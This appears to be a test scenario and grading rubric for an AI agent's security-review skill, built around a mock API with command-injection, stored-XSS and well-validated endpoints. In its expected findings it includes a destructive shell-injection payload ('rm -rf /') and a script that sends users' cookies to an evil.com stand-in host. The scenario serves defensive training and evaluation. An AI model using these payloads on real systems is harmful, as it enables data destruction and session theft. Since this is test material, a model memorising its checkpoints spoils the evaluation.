# Security Review Skill Verification

## Scenario

A developer has built a REST API with 3 endpoints in `src/api/`. One endpoint (`POST /api/users`) takes user input and passes it to `child_process.exec()` for a shell command. Another endpoint (`POST /api/comments`) stores user-provided HTML and renders it without sanitization. A third endpoint (`POST /api/orders`) has proper input validation with Zod. They invoke `/security-review`.

### Endpoint Details

| File | Endpoint | Behavior |
|------|----------|----------|
| `src/api/users.ts` | `POST /api/users` | Reads `req.body.username`, passes it to `child_process.exec(`useradd ${username}`)` to create a system user |
| `src/api/comments.ts` | `POST /api/comments` | Stores `req.body.html` in the database, renders it via `innerHTML` on the frontend without sanitization |
| `src/api/orders.ts` | `POST /api/orders` | Validates input with Zod schema, uses parameterized Prisma queries, returns structured response |

### Supporting Files

| File | Role |
|------|------|
| `src/api/users.ts` | Imports `exec` from `child_process`, constructs command string with user input |
| `src/api/comments.ts` | Stores raw HTML, frontend template renders with `innerHTML = comment.html` |
| `src/api/orders.ts` | Imports Zod schema from `src/schemas/order.ts`, validates before DB insert |
| `src/schemas/order.ts` | Zod schema with field-level validation (string lengths, numeric ranges) |
| `src/middleware/auth.ts` | JWT authentication middleware applied to all routes |
| `src/lib/db.ts` | Prisma client instance |

## Expected Outcome

Command injection in the `exec()` call is flagged as P0-Critical with HIGH confidence. XSS via unsanitized HTML is flagged as P0-Critical with HIGH confidence. The Zod-validated endpoint is noted as following good security practices. An attack chain analysis connects the command injection to potential RCE. The report maps findings to OWASP categories and provides specific remediation for each finding.

## Key Checkpoints

### Checkpoint 1: Agent identifies attack surface (3 API endpoints, user input handling)

**Phase:** Phase 1 (Determine Scope) / Phase 2 (Attack Surface Mapping)

The agent scans `src/api/` and identifies all 3 endpoints. For each endpoint, it catalogs user input entry points (`req.body.username`, `req.body.html`, `req.body` validated by Zod) and classifies each data flow as attacker-controlled.

**Evidence expected:**
```
Attack Surface:
- POST /api/users — accepts req.body.username (attacker-controlled)
  - Sensitive sink: child_process.exec() — OS command execution
- POST /api/comments — accepts req.body.html (attacker-controlled)
  - Sensitive sink: innerHTML assignment — DOM rendering
- POST /api/orders — accepts req.body (attacker-controlled, validated by Zod)
  - Sink: Prisma parameterized query (safe)
```

### Checkpoint 2: Agent performs cross-file data flow tracing (input to processing to output)

**Phase:** Phase 2 (Attack Surface Mapping) / Phase 3 (Security Scan)

For each endpoint, the agent traces the full data flow across files: where user input enters (route handler), what transformations or validations are applied (or not), and where the input is ultimately consumed (shell command, DOM, database). The agent reads the route handler files, follows imports, and checks for intermediate sanitization or validation.

**Evidence expected:**
- `users.ts`: `req.body.username` -> no validation -> string interpolation into `exec()` command -> OS execution
- `comments.ts`: `req.body.html` -> stored in DB -> retrieved by frontend -> assigned to `innerHTML` -> browser rendering
- `orders.ts`: `req.body` -> Zod schema validation (`src/schemas/order.ts`) -> parameterized Prisma query -> DB insert

### Checkpoint 3: Agent detects command injection (exec with user input) -- P0, HIGH confidence

**Phase:** Phase 3 (Security Scan)

The agent identifies that `child_process.exec()` in `src/api/users.ts` receives unsanitized user input via string interpolation. It recognizes this as an "Always Flag -- Critical" pattern from the quick-patterns reference. The agent searches the codebase for mitigations (input sanitization, allowlists, `execFile` usage) and finds none. Confidence is confirmed as HIGH.

**Evidence expected:**
```
Finding 1: OS Command Injection
- Severity: P0-Critical
- Confidence: HIGH
- Location: src/api/users.ts:XX
- Vulnerable code:
    const { username } = req.body;
    exec(`useradd ${username}`);
- Attack vector: Attacker sends username = "; rm -rf / #" which breaks out
  of the intended command and executes arbitrary shell commands
- OWASP: A03:2021 Injection
- Evidence: No input validation, sanitization, or allowlist found in
  users.ts, middleware, or shared utilities. exec() used instead of execFile().
- Recommended fix: Replace exec() with execFile('useradd', [username]) which
  does not invoke a shell. Add strict input validation (alphanumeric only,
  length limit) before the command call.
```

### Checkpoint 4: Agent detects stored XSS (unsanitized HTML rendering) -- P0, HIGH confidence

**Phase:** Phase 3 (Security Scan)

The agent identifies that user-provided HTML is stored in the database and later rendered via `innerHTML` without sanitization. It recognizes `innerHTML` with user data as an "Always Flag -- High" pattern. The agent searches for DOMPurify, sanitize-html, or CSP headers and finds none. Confidence is confirmed as HIGH.

**Evidence expected:**
```
Finding 2: Stored Cross-Site Scripting (XSS)
- Severity: P0-Critical
- Confidence: HIGH
- Location: src/api/comments.ts:XX (storage), frontend template (rendering)
- Vulnerable code:
    // Storage: stores raw HTML from user
    await db.comment.create({ data: { html: req.body.html } });
    // Rendering: assigns unsanitized HTML to DOM
    element.innerHTML = comment.html;
- Attack vector: Attacker stores <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  as a comment. Every user who views the page executes the script.
- OWASP: A03:2021 Injection (XSS subcategory)
- Evidence: No HTML sanitization library (DOMPurify, sanitize-html) found.
  No Content-Security-Policy header configured. Raw HTML stored and rendered.
- Recommended fix: Sanitize HTML before storage using DOMPurify or
  sanitize-html. Set CSP headers to block inline scripts. Consider storing
  markdown instead of HTML and rendering with a safe parser.
```

### Checkpoint 5: Agent acknowledges good practice (Zod validation on third endpoint)

**Phase:** Phase 3 (Security Scan) / Phase 5 (Generate Report)

The agent does not flag the orders endpoint as vulnerable. Instead, it notes that this endpoint follows good security practices: Zod schema validation on input, parameterized Prisma queries for database access, and explicit field selection.

**Evidence expected:**
```
Positive Observation:
- POST /api/orders uses Zod schema validation (src/schemas/order.ts) for
  input and parameterized Prisma queries for database access. This follows
  secure patterns for input handling and prevents injection attacks.
```

### Checkpoint 6: Agent checks for security-related error handling (do errors leak internal details?)

**Phase:** Phase 3 (Security Scan)

The agent checks whether error handling across the endpoints exposes internal details. It looks for: error messages that include stack traces, internal file paths, or database schema details; catch blocks that log sensitive request data; and whether authentication error responses are distinguishable from authorization errors in ways that help attackers enumerate valid users.

**Evidence expected:**
The agent examines error handling in each route handler and shared middleware. It checks whether `catch` blocks return raw error objects, whether Express error middleware sanitizes responses, and whether 401 vs 403 responses leak information about user existence.

### Checkpoint 7: Agent performs attack chain analysis (command injection to RCE to data exfiltration)

**Phase:** Phase 3 (Security Scan) / Phase 5 (Generate Report)

For the P0 findings, the agent analyzes how an attacker could chain vulnerabilities together. The command injection finding is connected to a full attack chain: the attacker exploits the command injection to gain remote code execution, which enables reading environment variables (database credentials, API keys), accessing the database directly, or exfiltrating sensitive data.

**Evidence expected:**
```
Attack Chain Analysis:
- Entry point: POST /api/users (unauthenticated or authenticated)
- Exploitation: Command injection via username parameter
- Impact chain:
  1. Arbitrary OS command execution (RCE)
  2. Read environment variables (DB credentials, API keys, secrets)
  3. Direct database access (bypass application-level controls)
  4. Data exfiltration (user data, payment info, credentials)
  5. Lateral movement (access internal network, other services)
  6. Persistent backdoor (create SSH keys, reverse shell, cron jobs)
- Data at risk: All application data, user PII, credentials, infrastructure access
- Maximum impact: Full server compromise
```

### Checkpoint 8: Agent maps findings to OWASP categories

**Phase:** Phase 3 (Security Scan) / Phase 5 (Generate Report)

Each finding is mapped to the relevant OWASP Top 10 and OWASP API Security Top 10 categories. The command injection maps to A03:2021 Injection. The stored XSS maps to A03:2021 Injection. The agent also checks applicable API Security categories (API8: Security Misconfiguration if error handling is weak).

**Evidence expected:**
Each finding in the report includes an explicit OWASP mapping (e.g., "OWASP: A03:2021 Injection") and relevant API Security Top 10 references where applicable.

### Checkpoint 9: Agent generates structured report with evidence for each finding

**Phase:** Phase 5 (Generate Report)

The agent produces a report following the template defined in the skill. It includes: scope summary, HIGH confidence findings with full evidence, MEDIUM confidence items (if any), a pre-conclusion audit table, and a conclusion with recommendation. Each finding includes the vulnerable code, attack vector, evidence of missing mitigations, and specific remediation.

**Evidence expected:**
```markdown
## Security Review: src/api/

### Scope
- Files reviewed: 6
- Risk tiers covered: high
- Method: static analysis

### HIGH Confidence Findings
[Finding 1: Command Injection — full details]
[Finding 2: Stored XSS — full details]

### Attack Chain Analysis
[Chain from command injection to RCE to data exfiltration]

### Positive Patterns
- POST /api/orders: Zod validation + parameterized Prisma queries

### Pre-Conclusion Audit
[Completeness table]

### Conclusion
[Assessment and recommendation: Needs fixes]
```

### Checkpoint 10: Agent provides specific remediation for each finding

**Phase:** Phase 5 (Generate Report)

Each finding includes actionable, specific remediation -- not generic advice. For command injection: replace `exec()` with `execFile()`, add input validation. For stored XSS: add DOMPurify, set CSP headers, consider markdown instead of raw HTML. Remediation is tailored to the actual code and technology stack.

**Evidence expected:**
Remediation includes code-level fixes that reference the actual files, the specific functions to replace, and the libraries to add. Not just "validate input" but "use `execFile('useradd', [username])` instead of `exec(`useradd ${username}`)` and add `const usernameSchema = z.string().regex(/^[a-zA-Z0-9_-]+$/).max(32)`."

## Anti-Patterns

### 1. Reporting theoretical vulnerabilities without tracing the actual data flow

**Wrong:** Agent flags a generic "possible injection" on the comments endpoint without tracing that `req.body.html` flows through storage and into `innerHTML` rendering.

Every finding must trace the specific data flow from input to sink. The Iron Law states: "Every reported vulnerability must include how an attacker exploits it." A finding without a traced path is speculation, not evidence.

### 2. Missing the command injection because it requires cross-file tracing

**Wrong:** Agent reviews `src/api/users.ts` but does not follow the `child_process` import or does not recognize that `req.body.username` reaches `exec()` because the command construction happens in a helper function or the data flows through intermediate variables.

Cross-file data flow tracing is essential for detecting real vulnerabilities. The agent must follow data from entry point through all transformations to the final sink, even when that path spans multiple files or functions.

### 3. Skipping the well-secured endpoint (should acknowledge good patterns)

**Wrong:** Agent reports findings for the two vulnerable endpoints but says nothing about `POST /api/orders`.

A thorough security review acknowledges both good and bad patterns. Noting that the orders endpoint uses Zod validation and parameterized queries reinforces good practices and gives the developer confidence that the review was comprehensive.

### 4. Reporting low-confidence findings as P0

**Wrong:** Agent flags the Zod-validated orders endpoint as "possible injection" because it uses a database query, even though the query is parameterized and input is validated.

Confidence must be calibrated honestly. The Iron Law states: "HIGH confidence: report as finding. MEDIUM: flag for manual verification. LOW: do not report. Never inflate confidence to make a report seem more important." A parameterized query with Zod-validated input is not P0.

### 5. Producing a generic checklist instead of targeted findings

**Wrong:** Agent outputs a boilerplate OWASP checklist with generic pass/fail entries instead of analyzing the actual code and producing findings with specific file locations, vulnerable code snippets, and attack vectors.

The skill requires evidence-based findings, not checkbox compliance. Each finding must include the actual vulnerable code and explain how an attacker exploits it.

### 6. Skipping error handling review

**Wrong:** Agent identifies the injection vulnerabilities but does not check whether error responses expose stack traces, internal paths, or database schema details.

Error handling is a security concern (OWASP A09: Security Logging and Monitoring Failures, API8: Security Misconfiguration). Verbose errors can help attackers refine their attacks, especially when combined with injection vulnerabilities.

## Known Gaps (Addressed)

| Gap | Description | Resolution |
|-----|-------------|------------|
| No security error handling check | The skill did not explicitly instruct checking whether error messages expose internal details, catch blocks log sensitive data, or auth failure responses are distinguishable | Added security error handling check to Phase 3 review checklist: check error messages for internal path/stack trace exposure, catch blocks for sensitive data logging, and auth error response uniformity with timing-safe comparison |
| No attack chain analysis | Individual findings were reported in isolation with no guidance to analyze how vulnerabilities could be combined for greater impact | Added attack chain analysis step after identifying individual vulnerabilities: for P0/P1 findings, document entry point, exploitation path, maximum impact, and data at risk |
| No cross-file data flow tracing | The analysis phase listed what to identify at each attack surface but did not explicitly guide tracing user input across file boundaries from entry point through transformations to sensitive sinks | Added cross-file data flow tracing instruction to Phase 2: for each user input entry point, trace across files to identify where input enters, what transformations apply, and where it reaches sensitive sinks without validation |
